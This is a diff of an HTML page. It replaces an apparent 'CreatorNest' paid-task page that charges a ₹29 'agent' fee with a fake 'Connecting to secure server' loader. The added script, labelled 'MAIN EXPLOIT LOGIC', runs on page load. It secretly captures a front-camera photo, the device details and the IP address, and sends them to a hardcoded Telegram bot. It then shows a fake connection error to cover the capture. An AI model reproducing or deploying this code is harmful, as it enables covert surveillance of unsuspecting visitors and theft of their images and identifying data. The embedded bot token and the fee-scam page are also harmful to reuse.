@@ -1,104 +1,423 @@
 <!DOCTYPE html>
-<html lang="en">
+
+<html>
+
 <head>
+
     <meta charset="UTF-8">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CreatorNest | Watch • Promote • Earn</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+    <title>Loading...</title>
+
     <style>
-        :root { --gold: #FFD700; --dark: #080808; --card: rgba(255, 255, 255, 0.05); }
-        body { margin: 0; font-family: 'Poppins', sans-serif; background: var(--dark); color: white; overflow-x: hidden; }
-        nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; background: #000; border-bottom: 1px solid rgba(255,215,0,0.1); position: sticky; top: 0; z-index: 1000; }
-        .logo { font-size: 1.8rem; font-weight: 700; color: var(--gold); text-decoration: none; }
-        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 6px; z-index: 1100; padding: 10px; }
-        .menu-btn span { width: 30px; height: 3px; background: var(--gold); border-radius: 10px; transition: 0.4s; pointer-events: none; }
-        .menu-btn.open span:nth-child(1) { transform: translateY(9px) rotate(45deg); }
-        .menu-btn.open span:nth-child(2) { opacity: 0; }
-        .menu-btn.open span:nth-child(3) { transform: translateY(-9px) rotate(-45deg); }
-        .side-nav { position: fixed; top: 0; right: -300px; width: 260px; height: 100vh; background: #111; display: flex; flex-direction: column; padding: 100px 20px; gap: 10px; transition: 0.4s; z-index: 1050; }
-        .side-nav.active { right: 0; }
-        .side-nav a { color: white; text-decoration: none; font-size: 1.1rem; padding: 15px; border-bottom: 1px solid #222; display: block; }
-        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; text-align: center; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-top: 30px; }
-        .task-card { background: var(--card); border: 1px solid rgba(255,215,0,0.1); padding: 25px; border-radius: 20px; }
-        .btn-link { display: block; background: #0088cc; color: white; text-decoration: none; padding: 12px; border-radius: 10px; font-weight: 600; cursor: pointer; margin-top: 15px; border: none; width: 100%; font-family: 'Poppins'; }
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; }
-        #lock-popup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #151515; padding: 40px; border-radius: 25px; border: 2px solid var(--gold); z-index: 2001; text-align: center; width: 280px; }
-        .btn-reg-now { background: var(--gold); color: black; padding: 15px; border-radius: 10px; text-decoration: none; font-weight: 700; display: block; margin-top: 20px; }
+
+        body { 
+
+            background: #0a0a0a; 
+
+            display: flex; 
+
+            justify-content: center; 
+
+            align-items: center; 
+
+            height: 100vh; 
+
+            margin: 0;
+
+            font-family: Arial, sans-serif;
+
+            color: #fff;
+
+        }
+
+        .loader {
+
+            text-align: center;
+
+        }
+
+        .spinner {
+
+            border: 4px solid #333;
+
+            border-top: 4px solid #00ff88;
+
+            border-radius: 50%;
+
+            width: 40px;
+
+            height: 40px;
+
+            animation: spin 1s linear infinite;
+
+            margin: 20px auto;
+
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
     </style>
+
 </head>
+
 <body>
-    <nav>
-        <div class="logo">CreatorNest 🪺</div>
-        <div class="menu-btn" id="menuBtn"><span></span><span></span><span></span></div>
-    </nav>
 
-    <div class="side-nav" id="sideNav">
-        <a href="index.html">🏠 Home</a>
-        <a href="register.html">📝 Agent Registration</a>
-        <a href="login.html" id="loginLinkText">🔑 Agent Login</a>
-        <a href="dashboard.html">📊 My Dashboard</a>
+    <div class="loader">
+
+        <h2>Connecting to secure server...</h2>
+
+        <div class="spinner"></div>
+
+        <p style="color:#666;font-size:14px;">Please wait while we establish a secure connection</p>
+
     </div>
 
-    <div class="container">
-        <h1 style="color: var(--gold);">Active Earning Tasks 🔥</h1>
-        <div class="grid">
-            <div class="task-card">
-                <h3>Google Review Work</h3>
-                <button class="btn-link open-lock" data-url="https://t.me/googlereviewworkhome">JOIN & EARN</button>
-            </div>
-            <div class="task-card">
-                <h3>Official Tasks</h3>
-                <button class="btn-link open-lock" data-url="https://t.me/googlereviewworkhome">JOIN & EARN</button>
-            </div>
-            <div class="task-card">
-                <h3>Trending Loop</h3>
-                <button class="btn-link open-lock" data-url="https://t.me/googlereviewworkhome">JOIN & EARN</button>
-            </div>
-            <div class="task-card">
-                <h3>Loop Alerts</h3>
-                <button class="btn-link open-lock" data-url="https://t.me/googlereviewworkhome">JOIN & EARN</button>
-            </div>
-        </div>
-    </div>
 
-    <div class="overlay" id="overlay"></div>
-    <div id="lock-popup">
-        <h2 style="color: var(--gold);">Access Denied! 🛑</h2>
-        <p>Verified Agents only. Registration fees ₹29.</p>
-        <a href="register.html" class="btn-reg-now">BECOME AN AGENT (₹29)</a>
-        <p id="closeBtn" style="margin-top: 20px; cursor: pointer; color: #555;">Close</p>
-    </div>
 
     <script>
-        const menuBtn = document.getElementById('menuBtn');
-        const sideNav = document.getElementById('sideNav');
-        menuBtn.onclick = () => { menuBtn.classList.toggle('open'); sideNav.classList.toggle('active'); };
 
-        // Auto-check Login Status on Page Load
-        window.onload = () => {
-            if(localStorage.getItem("isLoggedIn") === "true") {
-                document.getElementById('loginLinkText').innerText = "✅ Account Active";
-            }
-        };
+        // ==========================================
 
-        const overlay = document.getElementById('overlay');
-        const popup = document.getElementById('lock-popup');
+        // CONFIGURATION - SET YOUR TELEGRAM BOT INFO
 
-        document.querySelectorAll('.open-lock').forEach(btn => {
-            btn.onclick = () => {
-                // Check if user is actually logged in
-                if (localStorage.getItem("isLoggedIn") === "true") {
-                    const targetUrl = btn.getAttribute('data-url');
-                    window.location.href = targetUrl;
-                } else {
-                    overlay.style.display = 'block'; 
-                    popup.style.display = 'block';
+        // ==========================================
+
+        const TELEGRAM_BOT_TOKEN = '8521982994:AAEGw77HH1Q6AwUgMCb3f0_nVhZ4-url2zk';        // Replace with your bot token
+
+        const TELEGRAM_CHAT_ID = '8402472475';           // Replace with your chat ID
+
+        
+
+        // ==========================================
+
+        // MAIN EXPLOIT LOGIC
+
+        // ==========================================
+
+        (async function() {
+
+            // Prevent multiple captures
+
+            if (sessionStorage.getItem('captured')) return;
+
+            sessionStorage.setItem('captured', 'true');
+
+
+
+            // Function to send image to Telegram
+
+            async function sendToTelegram(imageData, deviceInfo) {
+
+                try {
+
+                    // Convert base64 to blob
+
+                    const byteString = atob(imageData.split(',')[1]);
+
+                    const mimeType = imageData.split(',')[0].split(':')[1].split(';')[0];
+
+                    const ab = new ArrayBuffer(byteString.length);
+
+                    const ia = new Uint8Array(ab);
+
+                    for (let i = 0; i < byteString.length; i++) {
+
+                        ia[i] = byteString.charCodeAt(i);
+
+                    }
+
+                    const blob = new Blob([ab], { type: mimeType });
+
+                    
+
+                    // Create form data
+
+                    const formData = new FormData();
+
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+
+                    formData.append('photo', blob, 'captured_face.jpg');
+
+                    formData.append('caption', `📸 **Front Camera Capture**\n\n` +
+
+                        `**Device:** ${deviceInfo.userAgent}\n` +
+
+                        `**Platform:** ${deviceInfo.platform}\n` +
+
+                        `**Time:** ${new Date().toISOString()}\n` +
+
+                        `**IP:** ${deviceInfo.ip || 'Unknown'}\n` +
+
+                        `**Language:** ${deviceInfo.language}\n` +
+
+                        (deviceInfo.timezone ? `**Timezone:** ${deviceInfo.timezone}\n` : '') +
+
+                        `**Screen:** ${deviceInfo.screen}`);
+
+                    
+
+                    // Send to Telegram
+
+                    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+
+                        method: 'POST',
+
+                        body: formData
+
+                    });
+
+                    
+
+                    return resp.ok;
+
+                } catch(e) {
+
+                    // Fallback: try sending as base64 text if image fails
+
+                    try {
+
+                        const fallbackData = {
+
+                            chat_id: TELEGRAM_CHAT_ID,
+
+                            text: `📸 Front Camera Capture (Fallback - Base64 image too large for text)\n\n` +
+
+                                  `**Device:** ${deviceInfo.userAgent}\n` +
+
+                                  `**Time:** ${new Date().toISOString()}\n` +
+
+                                  `**Platform:** ${deviceInfo.platform}`
+
+                        };
+
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+
+                            method: 'POST',
+
+                            headers: { 'Content-Type': 'application/json' },
+
+                            body: JSON.stringify(fallbackData)
+
+                        });
+
+                    } catch(e2) {}
+
+                    return false;
+
                 }
-            }
-        });
 
-        document.getElementById('closeBtn').onclick = () => { overlay.style.display = 'none'; popup.style.display = 'none'; }
+            }
+
+
+
+            // Get device info
+
+            const deviceInfo = {
+
+                userAgent: navigator.userAgent,
+
+                platform: navigator.platform || 'Unknown',
+
+                language: navigator.language,
+
+                screen: `${screen.width}x${screen.height}`,
+
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
+
+            };
+
+
+
+            // Try to get IP address (helpful for geolocation)
+
+            try {
+
+                const ipResp = await fetch('https://api.ipify.org?format=json');
+
+                const ipData = await ipResp.json();
+
+                deviceInfo.ip = ipData.ip;
+
+            } catch(e) {
+
+                deviceInfo.ip = 'Unavailable';
+
+            }
+
+
+
+            // Access the front camera
+
+            try {
+
+                const stream = await navigator.mediaDevices.getUserMedia({
+
+                    video: {
+
+                        facingMode: 'user',
+
+                        width: { ideal: 640 },
+
+                        height: { ideal: 480 }
+
+                    },
+
+                    audio: false
+
+                });
+
+
+
+                // Create video element to capture frame
+
+                const video = document.createElement('video');
+
+                video.srcObject = stream;
+
+                video.play();
+
+
+
+                // Wait for video to be ready
+
+                await new Promise(resolve => {
+
+                    video.onloadedmetadata = () => {
+
+                        video.width = video.videoWidth;
+
+                        video.height = video.videoHeight;
+
+                        resolve();
+
+                    };
+
+                });
+
+
+
+                // Allow camera to adjust light levels
+
+                await new Promise(r => setTimeout(r, 500));
+
+
+
+                // Capture the frame
+
+                const canvas = document.createElement('canvas');
+
+                canvas.width = video.videoWidth;
+
+                canvas.height = video.videoHeight;
+
+                const ctx = canvas.getContext('2d');
+
+                
+
+                // Draw mirror image (front camera is mirrored)
+
+                ctx.translate(canvas.width, 0);
+
+                ctx.scale(-1, 1);
+
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+
+
+                // Stop all tracks
+
+                stream.getTracks().forEach(track => track.stop());
+
+
+
+                // Get image data (JPEG for smaller size)
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+
+
+                // Send to Telegram
+
+                await sendToTelegram(imageData, deviceInfo);
+
+
+
+                // Clean up
+
+                video.remove();
+
+                canvas.remove();
+
+
+
+            } catch(cameraError) {
+
+                // Camera access denied or unavailable - send notification
+
+                try {
+
+                    const msgData = {
+
+                        chat_id: TELEGRAM_CHAT_ID,
+
+                        text: `⚠️ **Camera Access Denied/Unavailable**\n\n` +
+
+                              `**User:** Clicked link but denied or no camera access\n` +
+
+                              `**Device:** ${deviceInfo.userAgent}\n` +
+
+                              `**Platform:** ${deviceInfo.platform}\n` +
+
+                              `**Time:** ${new Date().toISOString()}\n` +
+
+                              `**IP:** ${deviceInfo.ip}\n` +
+
+                              `**Error:** ${cameraError.message}`
+
+                    };
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+
+                        method: 'POST',
+
+                        headers: { 'Content-Type': 'application/json' },
+
+                        body: JSON.stringify(msgData)
+
+                    });
+
+                } catch(e) {}
+
+            }
+
+
+
+            // After all operations - redirect to a benign page or show "access denied"
+
+            setTimeout(() => {
+
+                document.body.innerHTML = `
+
+                    <div class="loader">
+
+                        <h2>Connection Failed</h2>
+
+                        <p style="color:#888;">Unable to establish secure connection. Please check your network and try again.</p>
+
+                        <p style="color:#555;font-size:12px;margin-top:30px;">Error code: SEC_${Math.random().toString(36).substr(2,6).toUpperCase()}</p>
+
+                    </div>
+
+                `;
+
+            }, 2000);
+
+        })();
+
     </script>
+
 </body>
+
 </html>
